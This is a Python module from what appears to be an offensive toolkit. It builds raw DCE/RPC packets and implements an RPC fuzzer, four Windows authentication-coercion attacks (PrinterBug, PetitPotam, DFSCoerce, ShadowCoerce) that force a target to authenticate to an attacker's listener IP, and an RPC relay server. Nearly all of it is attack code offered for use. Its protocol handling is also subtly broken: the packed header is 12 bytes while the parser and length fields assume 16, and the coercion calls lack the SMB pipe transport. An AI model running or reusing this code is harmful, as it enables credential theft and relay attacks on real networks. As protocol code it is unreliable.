# app/core/rpc_protocol.py
"""
Raw RPC Protocol Implementation
Low-level RPC packet crafting and parsing for custom attacks
"""
import struct
import socket
import uuid
from typing import Dict, List, Optional, Tuple
import logging

class RPCPacket:
    """Raw RPC packet structure"""
    
    def __init__(self):
        self.version = 5
        self.packet_type = 0
        self.flags = 0
        self.data_representation = 0x10
        self.frag_length = 0
        self.auth_length = 0
        self.call_id = 0
        self.data = b''
    
    def pack(self) -> bytes:
        """Pack RPC packet into bytes"""
        header = struct.pack('<BBBBHHI',
            self.version,
            self.packet_type,
            self.flags,
            self.data_representation,
            self.frag_length,
            self.auth_length,
            self.call_id
        )
        return header + self.data
    
    @classmethod
    def unpack(cls, data: bytes) -> 'RPCPacket':
        """Unpack bytes into RPC packet"""
        if len(data) < 16:
            raise ValueError("Invalid RPC packet size")
        
        packet = cls()
        header = struct.unpack('<BBBBHHII', data[:16])
        
        packet.version = header[0]
        packet.packet_type = header[1]
        packet.flags = header[2]
        packet.data_representation = header[3]
        packet.frag_length = header[4]
        packet.auth_length = header[5]
        packet.call_id = header[6]
        packet.data = data[16:]
        
        return packet

class RPCClient:
    """Raw RPC client for custom attacks"""
    
    def __init__(self, target: str, port: int = 135):
        self.target = target
        self.port = port
        self.socket = None
        self.call_id = 1
    
    def connect(self) -> bool:
        """Connect to RPC endpoint"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.target, self.port))
            import time
            time.sleep(0.1)  # Brief delay after connection
            return True
        except Exception as e:
            print(f"[RPC] Connection failed: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from RPC endpoint"""
        if self.socket:
            try:
                self.socket.close()
            except Exception as _exc:
                pass
                logging.debug("Suppressed exception", exc_info=True)
            self.socket = None
    
    def send_bind_request(self, interface_uuid: str, version: Tuple[int, int]) -> bool:
        """Send RPC bind request"""
        try:
            # Create bind packet
            packet = RPCPacket()
            packet.packet_type = 11  # Bind request
            packet.call_id = self.call_id
            self.call_id += 1
            
            # Build bind data
            bind_data = self._build_bind_data(interface_uuid, version)
            packet.data = bind_data
            packet.frag_length = 16 + len(bind_data)
            
            # Send packet
            self.socket.send(packet.pack())
            
            # Receive response with timeout
            self.socket.settimeout(3)
            response = self.socket.recv(4096)
            
            if response:
                resp_packet = RPCPacket.unpack(response)
                return resp_packet.packet_type == 12  # Bind response
            
            return False
            
        except Exception as e:
            print(f"[RPC] Bind request failed: {e}")
            return False
    
    def send_request(self, opnum: int, data: bytes) -> Optional[bytes]:
        """Send RPC request"""
        try:
            packet = RPCPacket()
            packet.packet_type = 0  # Request
            packet.call_id = self.call_id
            self.call_id += 1
            
            # Build request data
            request_data = struct.pack('<HH', opnum, 0) + data
            packet.data = request_data
            packet.frag_length = 16 + len(request_data)
            
            # Send packet
            self.socket.send(packet.pack())
            
            # Receive response
            response = self.socket.recv(4096)
            if response:
                resp_packet = RPCPacket.unpack(response)
                if resp_packet.packet_type == 2:  # Response
                    return resp_packet.data
            
            return None
            
        except Exception as e:
            print(f"[RPC] Request failed: {e}")
            return None
    
    def _build_bind_data(self, interface_uuid: str, version: Tuple[int, int]) -> bytes:
        """Build RPC bind data"""
        # Build proper RPC bind request
        bind_data = b''
        
        # Max transmit and receive fragment size
        bind_data += struct.pack('<H', 0x05B8)  # Max transmit frag
        bind_data += struct.pack('<H', 0x05B8)  # Max receive frag
        bind_data += struct.pack('<I', 0x0000)  # Assoc group
        
        # Number of presentation contexts
        bind_data += struct.pack('<B', 0x01)    # Num contexts
        bind_data += b'\x00\x00\x00'             # Reserved (3 bytes)
        
        # Presentation context
        bind_data += struct.pack('<H', 0x0000)  # Context ID
        bind_data += struct.pack('<B', 0x01)    # Num transfer syntaxes
        bind_data += b'\x00'                    # Reserved
        
        # Abstract syntax (interface UUID and version)
        uuid_bytes = uuid.UUID(interface_uuid).bytes_le
        bind_data += uuid_bytes
        bind_data += struct.pack('<HH', version[0], version[1])
        
        # Transfer syntax (NDR)
        ndr_uuid = uuid.UUID('8a885d04-1ceb-11c9-9fe8-08002b104860').bytes_le
        bind_data += ndr_uuid
        bind_data += struct.pack('<I', 0x00000002)  # NDR version
        
        return bind_data

class RPCFuzzer:
    """RPC fuzzing engine for vulnerability discovery"""
    
    def __init__(self, target: str):
        self.target = target
        self.client = RPCClient(target)
        self.crash_count = 0
        self.interesting_responses = []
    
    def fuzz_interface(self, interface_uuid: str, version: Tuple[int, int], max_opnum: int = 100) -> Dict:
        """Fuzz RPC interface operations"""
        results = {
            'interface': interface_uuid,
            'crashes': [],
            'errors': [],
            'interesting': [],
            'total_tests': 0
        }
        
        print(f"[FUZZ] Starting fuzzing of {interface_uuid}")
        
        if not self.client.connect():
            return {'error': 'Connection failed'}
        
        try:
            # Bind to interface
            if not self.client.send_bind_request(interface_uuid, version):
                return {'error': 'Bind failed'}
            
            # Fuzz each operation
            for opnum in range(max_opnum):
                if not self._fuzz_operation(opnum, results):
                    break
                
                results['total_tests'] += 1
                
                if results['total_tests'] % 10 == 0:
                    print(f"[FUZZ] Tested {results['total_tests']} operations")
            
            print(f"[FUZZ] Fuzzing complete: {len(results['crashes'])} crashes, {len(results['interesting'])} interesting responses")
            
        finally:
            self.client.disconnect()
        
        return results
    
    def _fuzz_operation(self, opnum: int, results: Dict) -> bool:
        """Fuzz single RPC operation"""
        try:
            # Generate fuzz payloads
            payloads = self._generate_fuzz_payloads()
            
            for payload in payloads:
                try:
                    response = self.client.send_request(opnum, payload)
                    
                    if response is None:
                        # Potential crash or hang
                        results['crashes'].append({
                            'opnum': opnum,
                            'payload': payload.hex(),
                            'type': 'no_response'
                        })
                        return False
                    
                    # Check for interesting responses
                    if self._is_interesting_response(response):
                        results['interesting'].append({
                            'opnum': opnum,
                            'payload': payload.hex(),
                            'response': response.hex()[:100]
                        })
                
                except Exception as e:
                    results['errors'].append({
                        'opnum': opnum,
                        'error': str(e)
                    })
            
            return True
            
        except Exception:
            return False
    
    def _generate_fuzz_payloads(self) -> List[bytes]:
        """Generate fuzzing payloads"""
        payloads = []
        
        # Basic payloads
        payloads.append(b'A' * 100)  # Buffer overflow
        payloads.append(b'A' * 1000) # Large buffer
        payloads.append(b'\x00' * 100) # Null bytes
        payloads.append(b'\xff' * 100) # High bytes
        
        # Format string payloads
        payloads.append(b'%s%s%s%s%s')
        payloads.append(b'%x%x%x%x%x')
        
        # Integer overflow payloads
        payloads.append(struct.pack('<I', 0xffffffff))
        payloads.append(struct.pack('<I', 0x80000000))
        
        # Malformed structures
        payloads.append(b'\x41\x41\x41\x41' + b'\x00' * 96)
        
        return payloads
    
    def _is_interesting_response(self, response: bytes) -> bool:
        """Check if response is interesting"""
        if len(response) > 1000:  # Large response
            return True
        
        # Check for error codes that might indicate vulnerabilities
        interesting_patterns = [
            b'access',
            b'denied',
            b'error',
            b'exception',
            b'fault'
        ]
        
        response_lower = response.lower()
        for pattern in interesting_patterns:
            if pattern in response_lower:
                return True
        
        return False

class RPCCoercionAttacks:
    """RPC coercion attacks (PrinterBug, PetitPotam, etc.)"""
    
    def __init__(self, target: str):
        self.target = target
        self.attacks = {
            'printerbug': self._printerbug_attack,
            'petitpotam': self._petitpotam_attack,
            'dfscoerce': self._dfscoerce_attack,
            'shadowcoerce': self._shadowcoerce_attack
        }
    
    def execute_coercion_attack(self, attack_type: str, listener_ip: str) -> Dict:
        """Execute coercion attack"""
        if attack_type not in self.attacks:
            return {'success': False, 'error': f'Unknown attack type: {attack_type}'}
        
        print(f"[COERCE] Starting {attack_type} attack against {self.target}")
        print(f"[COERCE] Listener IP: {listener_ip}")
        
        try:
            return self.attacks[attack_type](listener_ip)
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _printerbug_attack(self, listener_ip: str) -> Dict:
        """PrinterBug/SpoolSample attack"""
        try:
            client = RPCClient(self.target, 445)  # SMB port
            
            if not client.connect():
                return {'success': False, 'error': 'Connection failed'}
            
            # Bind to spoolss interface
            spoolss_uuid = "12345678-1234-abcd-ef00-0123456789ab"
            if not client.send_bind_request(spoolss_uuid, (1, 0)):
                return {'success': False, 'error': 'Spoolss bind failed'}
            
            # Craft RpcRemoteFindFirstPrinterChangeNotificationEx call
            # This forces the target to authenticate to our listener
            unc_path = f"\\\\{listener_ip}\\share"
            payload = unc_path.encode('utf-16le') + b'\x00\x00'
            
            response = client.send_request(65, payload)  # OpNum for the call
            
            client.disconnect()
            
            if response:
                print(f"[COERCE] PrinterBug attack sent successfully")
                return {
                    'success': True,
                    'attack': 'PrinterBug',
                    'target': self.target,
                    'listener': listener_ip
                }
            else:
                return {'success': False, 'error': 'No response from target'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _petitpotam_attack(self, listener_ip: str) -> Dict:
        """PetitPotam attack via EFS RPC"""
        try:
            client = RPCClient(self.target, 445)
            
            if not client.connect():
                return {'success': False, 'error': 'Connection failed'}
            
            # Bind to EFS interface
            efs_uuid = "df1941c5-fe89-4e79-bf10-463657acf44d"
            if not client.send_bind_request(efs_uuid, (1, 0)):
                return {'success': False, 'error': 'EFS bind failed'}
            
            # Craft EfsRpcOpenFileRaw call
            unc_path = f"\\\\{listener_ip}\\share\\file.txt"
            payload = unc_path.encode('utf-16le') + b'\x00\x00'
            
            response = client.send_request(0, payload)  # EfsRpcOpenFileRaw
            
            client.disconnect()
            
            if response:
                print(f"[COERCE] PetitPotam attack sent successfully")
                return {
                    'success': True,
                    'attack': 'PetitPotam',
                    'target': self.target,
                    'listener': listener_ip
                }
            else:
                return {'success': False, 'error': 'No response from target'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _dfscoerce_attack(self, listener_ip: str) -> Dict:
        """DFSCoerce attack"""
        try:
            client = RPCClient(self.target, 445)
            
            if not client.connect():
                return {'success': False, 'error': 'Connection failed'}
            
            # Bind to DFS interface
            dfs_uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
            if not client.send_bind_request(dfs_uuid, (3, 0)):
                return {'success': False, 'error': 'DFS bind failed'}
            
            # Craft NetrDfsRemoveStdRoot call
            unc_path = f"\\\\{listener_ip}\\share"
            payload = unc_path.encode('utf-16le') + b'\x00\x00'
            
            response = client.send_request(13, payload)  # NetrDfsRemoveStdRoot
            
            client.disconnect()
            
            if response:
                print(f"[COERCE] DFSCoerce attack sent successfully")
                return {
                    'success': True,
                    'attack': 'DFSCoerce',
                    'target': self.target,
                    'listener': listener_ip
                }
            else:
                return {'success': False, 'error': 'No response from target'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _shadowcoerce_attack(self, listener_ip: str) -> Dict:
        """ShadowCoerce attack"""
        try:
            client = RPCClient(self.target, 445)
            
            if not client.connect():
                return {'success': False, 'error': 'Connection failed'}
            
            # Bind to Volume Shadow Copy interface
            vss_uuid = "01954e6b-9254-4e6e-808c-c9e05d007696"
            if not client.send_bind_request(vss_uuid, (1, 0)):
                return {'success': False, 'error': 'VSS bind failed'}
            
            # Craft shadow copy call
            unc_path = f"\\\\{listener_ip}\\share"
            payload = unc_path.encode('utf-16le') + b'\x00\x00'
            
            response = client.send_request(0, payload)
            
            client.disconnect()
            
            if response:
                print(f"[COERCE] ShadowCoerce attack sent successfully")
                return {
                    'success': True,
                    'attack': 'ShadowCoerce',
                    'target': self.target,
                    'listener': listener_ip
                }
            else:
                return {'success': False, 'error': 'No response from target'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

class RPCRelayEngine:
    """RPC relay attack engine"""
    
    def __init__(self, listen_port: int = 135):
        self.listen_port = listen_port
        self.relay_targets = []
        self.active_relays = {}
        self.server_socket = None
    
    def add_relay_target(self, target: str, port: int = 135):
        """Add target for RPC relay"""
        self.relay_targets.append({'host': target, 'port': port})
        print(f"[RELAY] Added relay target: {target}:{port}")
    
    def start_relay_server(self) -> bool:
        """Start RPC relay server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.listen_port))
            self.server_socket.listen(5)
            
            print(f"[RELAY] RPC relay server listening on port {self.listen_port}")
            
            while True:
                client_socket, addr = self.server_socket.accept()
                print(f"[RELAY] Incoming RPC connection from {addr[0]}")
                
                # Handle relay in separate thread
                import threading
                relay_thread = threading.Thread(
                    target=self._handle_relay_connection,
                    args=(client_socket, addr)
                )
                relay_thread.daemon = True
                relay_thread.start()
            
        except Exception as e:
            print(f"[RELAY] Relay server failed: {e}")
            return False
    
    def _handle_relay_connection(self, client_socket, addr):
        """Handle individual RPC relay connection"""
        try:
            # Select relay target
            if not self.relay_targets:
                print(f"[RELAY] No relay targets configured")
                return
            
            target = self.relay_targets[0]  # Use first target
            
            # Connect to relay target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((target['host'], target['port']))
            
            print(f"[RELAY] Relaying RPC from {addr[0]} to {target['host']}:{target['port']}")
            
            # Relay RPC traffic
            self._relay_rpc_traffic(client_socket, target_socket)
            
        except Exception as e:
            print(f"[RELAY] Relay connection failed: {e}")
        finally:
            try:
                client_socket.close()
                target_socket.close()
            except Exception as _exc:
                pass
                logging.debug("Suppressed exception", exc_info=True)
    
    def _relay_rpc_traffic(self, client_socket, target_socket):
        """Relay RPC traffic between client and target"""
        import threading
        
        def relay_data(source, destination, direction):
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    
                    # Log RPC packets
                    if len(data) >= 16:
                        try:
                            packet = RPCPacket.unpack(data)
                            print(f"[RELAY] {direction} - Type: {packet.packet_type}, Call ID: {packet.call_id}")
                        except Exception as _exc:
                            pass
                            logging.debug("Suppressed exception", exc_info=True)
                    
                    destination.send(data)
            except Exception as _exc:
                pass
                logging.debug("Suppressed exception", exc_info=True)
        
        # Start relay threads
        client_to_target = threading.Thread(
            target=relay_data,
            args=(client_socket, target_socket, "Client->Target")
        )
        target_to_client = threading.Thread(
            target=relay_data,
            args=(target_socket, client_socket, "Target->Client")
        )
        
        client_to_target.daemon = True
        target_to_client.daemon = True
        
        client_to_target.start()
        target_to_client.start()
        
        # Wait for threads to complete
        client_to_target.join()
        target_to_client.join()
    
    def stop_relay_server(self):
        """Stop RPC relay server"""
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception as _exc:
                pass
                logging.debug("Suppressed exception", exc_info=True)
            self.server_socket = None
        
        print(f"[RELAY] RPC relay server stopped")